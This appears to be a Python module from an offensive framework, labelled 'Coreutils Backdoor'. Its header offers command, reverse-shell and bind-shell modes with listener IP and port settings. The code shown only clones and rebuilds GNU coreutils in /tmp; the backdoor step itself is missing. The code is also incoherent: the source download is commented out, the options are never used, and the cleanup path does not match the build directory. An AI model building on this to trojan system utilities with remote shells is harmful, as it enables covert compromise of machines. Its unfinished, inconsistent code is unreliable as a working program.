#!/usr/bin/python3
#[ONLINE][Backdoor] Coreutils Backdoor
#MODE,yes,Mode to use (cmd, rev, bind)
#STATIC,no,Build biniaries as static
#CMD,no,Command to execute while calling choosen coreutils binaries
#LISTENER_IP,no,IP address to send reverse shell to
#LISTENER_PORT,no,TCP port of listener
#BIND_PORT,no,TCP port to set bind shell on
#END

import subprocess
import os

def check_coreutils_version():
    coreutils_version = subprocess.check_output("dpkg -l | grep -i coreutils", shell=True).decode('utf-8').split()[2]
    return coreutils_version.split('-')[0]

def get_coreutils_sources(coreutils_version):
    os.system("cd /tmp && git clone https://github.com/coreutils/coreutils.git && cd /tmp/coreutils && git checkout v" + coreutils_version)

def clean_sources():
    os.system("rm -rf /tmp/coreutils_source*")

def build_sources():
    os.system("cd /tmp/coreutils && ./bootstrap") #
    os.system("cd /tmp/coreutils && export FORCE_UNSAFE_CONFIGURE=1 && ./configure") #
    os.system("cd /tmp/coreutils && sed -i 's/IO_ftrylockfile/IO_EOF_SEEN/' lib/*.c && echo '#define _IO_IN_BACKUP 0x100' >> lib/stdio-impl.h") # Add glibc2.28 patch
    os.system("cd /tmp/coreutils && make CFLAGS='-Wno-error'") #
    os.system("unset FORCE_UNSAFE_CONFIGURE")

def main(arguments):
    #get_coreutils_sources(check_coreutils_version())
    build_sources()
    clean_sources()

main("null")
